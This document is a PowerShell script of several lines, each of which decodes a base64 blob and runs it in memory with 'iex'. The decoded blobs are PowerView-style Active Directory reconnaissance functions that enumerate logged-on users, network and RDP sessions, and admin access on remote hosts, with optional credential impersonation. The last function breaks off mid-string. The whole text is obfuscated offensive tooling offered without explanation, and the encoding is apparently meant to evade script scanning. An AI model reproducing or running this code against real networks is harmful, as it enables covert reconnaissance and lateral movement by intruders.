iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldExvZ2dlZG9uIHsKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9nZ2VkT25Vc2VySW5mbycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAkUXVlcnlMZXZlbCA9IDEKICAgICAgICAgICAgJFB0ckluZm8gPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAkRW50cmllc1JlYWQgPSAwCiAgICAgICAgICAgICRUb3RhbFJlYWQgPSAwCiAgICAgICAgICAgICRSZXN1bWVIYW5kbGUgPSAwCiAgICAgICAgICAgICRSZXN1bHQgPSAkTmV0YXBpMzI6Ok5ldFdrc3RhVXNlckVudW0oJENvbXB1dGVyLCAkUXVlcnlMZXZlbCwgW3JlZl0kUHRySW5mbywgLTEsIFtyZWZdJEVudHJpZXNSZWFkLCBbcmVmXSRUb3RhbFJlYWQsIFtyZWZdJFJlc3VtZUhhbmRsZSkKICAgICAgICAgICAgJE9mZnNldCA9ICRQdHJJbmZvLlRvSW50NjQoKQogICAgICAgICAgICBpZiAoKCRSZXN1bHQgLWVxIDApIC1hbmQgKCRPZmZzZXQgLWd0IDApKSB7CiAgICAgICAgICAgICAgICAkSW5jcmVtZW50ID0gJFdLU1RBX1VTRVJfSU5GT18xOjpHZXRTaXplKCkKICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAoJGkgLWx0ICRFbnRyaWVzUmVhZCk7ICRpKyspIHsKICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldAogICAgICAgICAgICAgICAgICAgICRJbmZvID0gJE5ld0ludFB0ciAtYXMgJFdLU1RBX1VTRVJfSU5GT18xCiAgICAgICAgICAgICAgICAgICAgJExvZ2dlZE9uID0gJEluZm8gfCBTZWxlY3QtT2JqZWN0ICoKICAgICAgICAgICAgICAgICAgICAkTG9nZ2VkT24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAkTG9nZ2VkT24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkxvZ2dlZE9uVXNlckluZm8nKQogICAgICAgICAgICAgICAgICAgICRPZmZzZXQgPSAkTmV3SW50UHRyLlRvSW50NjQoKQogICAgICAgICAgICAgICAgICAgICRPZmZzZXQgKz0gJEluY3JlbWVudAogICAgICAgICAgICAgICAgICAgICRMb2dnZWRPbgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJE51bGwgPSAkTmV0YXBpMzI6Ok5ldEFwaUJ1ZmZlckZyZWUoJFB0ckluZm8pCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LU5ldExvZ2dlZG9uXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkUmVzdWx0KS5NZXNzYWdlKSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldFNlc3Npb24gewogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5TZXNzaW9uSW5mbycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAkUXVlcnlMZXZlbCA9IDEwCiAgICAgICAgICAgICRQdHJJbmZvID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgJEVudHJpZXNSZWFkID0gMAogICAgICAgICAgICAkVG90YWxSZWFkID0gMAogICAgICAgICAgICAkUmVzdW1lSGFuZGxlID0gMAogICAgICAgICAgICAkUmVzdWx0ID0gJE5ldGFwaTMyOjpOZXRTZXNzaW9uRW51bSgkQ29tcHV0ZXIsICcnLCAkVXNlck5hbWUsICRRdWVyeUxldmVsLCBbcmVmXSRQdHJJbmZvLCAtMSwgW3JlZl0kRW50cmllc1JlYWQsIFtyZWZdJFRvdGFsUmVhZCwgW3JlZl0kUmVzdW1lSGFuZGxlKQogICAgICAgICAgICAkT2Zmc2V0ID0gJFB0ckluZm8uVG9JbnQ2NCgpCiAgICAgICAgICAgIGlmICgoJFJlc3VsdCAtZXEgMCkgLWFuZCAoJE9mZnNldCAtZ3QgMCkpIHsKICAgICAgICAgICAgICAgICRJbmNyZW1lbnQgPSAkU0VTU0lPTl9JTkZPXzEwOjpHZXRTaXplKCkKICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAoJGkgLWx0ICRFbnRyaWVzUmVhZCk7ICRpKyspIHsKICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldAogICAgICAgICAgICAgICAgICAgICRJbmZvID0gJE5ld0ludFB0ciAtYXMgJFNFU1NJT05fSU5GT18xMAogICAgICAgICAgICAgICAgICAgICRTZXNzaW9uID0gJEluZm8gfCBTZWxlY3QtT2JqZWN0ICoKICAgICAgICAgICAgICAgICAgICAkU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICRTZXNzaW9uLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5TZXNzaW9uSW5mbycpCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCA9ICROZXdJbnRQdHIuVG9JbnQ2NCgpCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CiAgICAgICAgICAgICAgICAgICAgJFNlc3Npb24KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICROdWxsID0gJE5ldGFwaTMyOjpOZXRBcGlCdWZmZXJGcmVlKCRQdHJJbmZvKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRTZXNzaW9uXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkUmVzdWx0KS5NZXNzYWdlKSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVJlZ0xvZ2dlZE9uIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlJlZ0xvZ2dlZE9uVXNlcicpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JwogICAgKQogICAgQkVHSU4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkUmVnID0gW01pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeUtleV06Ok9wZW5SZW1vdGVCYXNlS2V5KCdVc2VycycsICIkQ29tcHV0ZXJOYW1lIikKICAgICAgICAgICAgICAgICRSZWcuR2V0U3ViS2V5TmFtZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfIC1tYXRjaCAnUy0xLTUtMjEtWzAtOV0rLVswLTldKy1bMC05XSstWzAtOV0rJCcgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSBDb252ZXJ0RnJvbS1TSUQgLU9iamVjdFNJRCAkXyAtT3V0cHV0VHlwZSAnRG9tYWluU2ltcGxlJwogICAgICAgICAgICAgICAgICAgIGlmICgkVXNlck5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lLCAkVXNlckRvbWFpbiA9ICRVc2VyTmFtZS5TcGxpdCgnQCcpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkXwogICAgICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRSZWdMb2dnZWRPblVzZXIgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJFJlZ0xvZ2dlZE9uVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICIkQ29tcHV0ZXJOYW1lIgogICAgICAgICAgICAgICAgICAgICRSZWdMb2dnZWRPblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlckRvbWFpbicgJFVzZXJEb21haW4KICAgICAgICAgICAgICAgICAgICAkUmVnTG9nZ2VkT25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJOYW1lJyAkVXNlck5hbWUKICAgICAgICAgICAgICAgICAgICAkUmVnTG9nZ2VkT25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJTSUQnICRfCiAgICAgICAgICAgICAgICAgICAgJFJlZ0xvZ2dlZE9uVXNlci5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuUmVnTG9nZ2VkT25Vc2VyJykKICAgICAgICAgICAgICAgICAgICAkUmVnTG9nZ2VkT25Vc2VyCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1SZWdMb2dnZWRPbl0gRXJyb3Igb3BlbmluZyByZW1vdGUgcmVnaXN0cnkgb24gJyRDb21wdXRlck5hbWUnIDogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldFJEUFNlc3Npb24gewogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5SRFBTZXNzaW9uSW5mbycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAkSGFuZGxlID0gJFd0c2FwaTMyOjpXVFNPcGVuU2VydmVyRXgoJENvbXB1dGVyKQogICAgICAgICAgICBpZiAoJEhhbmRsZSAtbmUgMCkgewogICAgICAgICAgICAgICAgJHBwU2Vzc2lvbkluZm8gPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAgICAgJHBDb3VudCA9IDAKICAgICAgICAgICAgICAgICRSZXN1bHQgPSAkV3RzYXBpMzI6OldUU0VudW1lcmF0ZVNlc3Npb25zRXgoJEhhbmRsZSwgW3JlZl0xLCAwLCBbcmVmXSRwcFNlc3Npb25JbmZvLCBbcmVmXSRwQ291bnQpOyRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICAgICAgICAgICRPZmZzZXQgPSAkcHBTZXNzaW9uSW5mby5Ub0ludDY0KCkKICAgICAgICAgICAgICAgIGlmICgoJFJlc3VsdCAtbmUgMCkgLWFuZCAoJE9mZnNldCAtZ3QgMCkpIHsKICAgICAgICAgICAgICAgICAgICAkSW5jcmVtZW50ID0gJFdUU19TRVNTSU9OX0lORk9fMTo6R2V0U2l6ZSgpCiAgICAgICAgICAgICAgICAgICAgZm9yICgkaSA9IDA7ICgkaSAtbHQgJHBDb3VudCk7ICRpKyspIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE5ld0ludFB0ciA9IE5ldy1PYmplY3QgU3lzdGVtLkludHB0ciAtQXJndW1lbnRMaXN0ICRPZmZzZXQKICAgICAgICAgICAgICAgICAgICAgICAgJEluZm8gPSAkTmV3SW50UHRyIC1hcyAkV1RTX1NFU1NJT05fSU5GT18xCiAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJEluZm8ucEhvc3ROYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRJbmZvLnBIb3N0TmFtZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTZXNzaW9uTmFtZScgJEluZm8ucFNlc3Npb25OYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkKC1ub3QgJEluZm8ucERvbWFpbk5hbWUpIC1vciAoJEluZm8ucERvbWFpbk5hbWUgLWVxICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlck5hbWUnICIkKCRJbmZvLnBVc2VyTmFtZSkiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgIiQoJEluZm8ucERvbWFpbk5hbWUpXCQoJEluZm8ucFVzZXJOYW1lKSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJRCcgJEluZm8uU2Vzc2lvbklECiAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1N0YXRlJyAkSW5mby5TdGF0ZQogICAgICAgICAgICAgICAgICAgICAgICAkcHBCdWZmZXIgPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAgICAgICAgICAgICAkcEJ5dGVzUmV0dXJuZWQgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHQyID0gJFd0c2FwaTMyOjpXVFNRdWVyeVNlc3Npb25JbmZvcm1hdGlvbigkSGFuZGxlLCAkSW5mby5TZXNzaW9uSUQsIDE0LCBbcmVmXSRwcEJ1ZmZlciwgW3JlZl0kcEJ5dGVzUmV0dXJuZWQpOyRMYXN0RXJyb3IyID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0MiAtZXEgMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRSRFBTZXNzaW9uXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkTGFzdEVycm9yMikuTWVzc2FnZSkiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT2Zmc2V0MiA9ICRwcEJ1ZmZlci5Ub0ludDY0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXdJbnRQdHIyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldDIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbmZvMiA9ICROZXdJbnRQdHIyIC1hcyAkV1RTX0NMSUVOVF9BRERSRVNTCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU291cmNlSVAgPSAkSW5mbzIuQWRkcmVzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRTb3VyY2VJUFsyXSAtbmUgMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTb3VyY2VJUCA9IFtTdHJpbmddJFNvdXJjZUlQWzJdKycuJytbU3RyaW5nXSRTb3VyY2VJUFszXSsnLicrW1N0cmluZ10kU291cmNlSVBbNF0rJy4nK1tTdHJpbmddJFNvdXJjZUlQWzVdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU291cmNlSVAgPSAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU291cmNlSVAnICRTb3VyY2VJUAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlJEUFNlc3Npb25JbmZvJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICRXdHNhcGkzMjo6V1RTRnJlZU1lbW9yeSgkcHBCdWZmZXIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT2Zmc2V0ICs9ICRJbmNyZW1lbnQKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICRXdHNhcGkzMjo6V1RTRnJlZU1lbW9yeUV4KDIsICRwcFNlc3Npb25JbmZvLCAkcENvdW50KQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRSRFBTZXNzaW9uXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkTGFzdEVycm9yKS5NZXNzYWdlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICROdWxsID0gJFd0c2FwaTMyOjpXVFNDbG9zZVNlcnZlcigkSGFuZGxlKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRSRFBTZXNzaW9uXSBFcnJvciBvcGVuaW5nIHRoZSBSZW1vdGUgRGVza3RvcCBTZXNzaW9uIEhvc3QgKFJEIFNlc3Npb24gSG9zdCkgc2VydmVyIGZvcjogJENvbXB1dGVyTmFtZSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gVGVzdC1BZG1pbkFjY2VzcyB7CiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkFkbWluQWNjZXNzJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICdsb2NhbGhvc3QnLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICRIYW5kbGUgPSAkQWR2YXBpMzI6Ok9wZW5TQ01hbmFnZXJXKCJcXCRDb21wdXRlciIsICdTZXJ2aWNlc0FjdGl2ZScsIDB4RjAwM0YpOyRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICAgICAgJElzQWRtaW4gPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICRJc0FkbWluIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgIGlmICgkSGFuZGxlIC1uZSAwKSB7CiAgICAgICAgICAgICAgICAkTnVsbCA9ICRBZHZhcGkzMjo6Q2xvc2VTZXJ2aWNlSGFuZGxlKCRIYW5kbGUpCiAgICAgICAgICAgICAgICAkSXNBZG1pbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJc0FkbWluJyAkVHJ1ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1Rlc3QtQWRtaW5BY2Nlc3NdIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgJElzQWRtaW4gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNBZG